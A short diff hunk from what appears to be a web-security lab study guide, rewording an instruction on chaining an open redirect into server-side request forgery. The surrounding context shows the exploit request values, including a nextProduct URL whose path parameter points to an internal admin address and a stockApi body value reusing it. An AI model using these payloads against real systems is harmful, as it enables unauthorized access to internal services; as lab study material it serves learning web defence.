@@ -1694,7 +1694,7 @@ hacktricks xss cross site scripting server side xss dynamic pdf
 https://TARGET.net/product/nextProduct?currentProductId=1&path=http%3a//192.168.0.12%3a8080/admin
 ```  
 
->On the POST stock request, replace the StockAPI value with the partial path not the absolute URL from above GET request.  
+>On the POST stock request, replace the StockAPI value with the partial path, not the absolute URL, from the ```nextProduct``` GET request URL as the value of the ```stockAPI``` parameter.  
 
 ```
 stockApi=/product/nextProduct?currentProductId=1&path=http%3a//192.168.0.12%3a8080/admin
